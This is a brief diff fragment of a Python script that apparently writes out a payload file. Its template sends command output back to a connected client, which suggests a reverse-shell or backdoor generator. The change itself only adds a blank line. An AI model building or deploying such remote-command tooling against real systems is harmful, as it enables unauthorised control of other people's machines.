@@ -99,6 +99,7 @@ while True:
     print("[-] Sending response...")
     client.send(output + output_error)
     """
+    
 banner()
 file_name = input("[!] Insert a file name.py: ")
 arq = open(file_name, 'w')
